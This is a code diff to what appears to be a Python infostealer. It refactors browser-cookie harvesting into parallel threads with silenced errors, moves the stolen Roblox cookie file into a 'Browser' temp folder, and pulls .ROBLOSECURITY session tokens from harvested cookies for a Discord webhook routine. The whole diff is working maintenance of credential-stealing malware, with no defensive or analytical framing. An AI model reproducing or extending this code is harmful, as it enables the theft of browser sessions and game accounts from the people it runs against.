@@ -368,7 +368,7 @@ class Discord:
 
     def robloxinfo(self, webhook):
         if __CONFIG__["roblox"]:
-            with open(os.path.join(temp_path, "Roblox", "roblox cookies.txt"), 'r', encoding="utf-8") as f:
+            with open(os.path.join(temp_path, "Browser", "roblox cookies.txt"), 'r', encoding="utf-8") as f:
                 robo_cookie = f.read().strip()
                 if robo_cookie == "No Roblox Cookies Found":
                     pass
@@ -547,8 +547,14 @@ class Browsers:
         ]
 
         os.makedirs(os.path.join(temp_path, "Browser"), exist_ok=True)
-        os.makedirs(os.path.join(temp_path, "Roblox"), exist_ok=True)
 
+        def process_browser(name, path, profile, func):
+            try:
+                func(name, path, profile)
+            except:
+                pass
+
+        threads = []
         for name, path in self.browsers.items():
             if not os.path.isdir(path):
                 continue
@@ -563,10 +569,12 @@ class Browsers:
 
             for profile in self.profiles:
                 for func in self.funcs:
-                    try:
-                        func(name, path, profile)
-                    except:
-                        pass
+                    thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
+                    thread.start()
+                    threads.append(thread)
+
+        for thread in threads:
+            thread.join()
 
         self.roblox_cookies()
 
@@ -668,7 +676,7 @@ class Browsers:
         else:
             robo_cookie = ""
             with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'r', encoding="utf-8") as g:
-                with open(os.path.join(temp_path, "Roblox", "roblox cookies.txt"), 'w', encoding="utf-8") as f:
+                with open(os.path.join(temp_path, "Browser", "roblox cookies.txt"), 'w', encoding="utf-8") as f:
                     try:
                         for line in g:
                             if ".ROBLOSECURITY" in line:
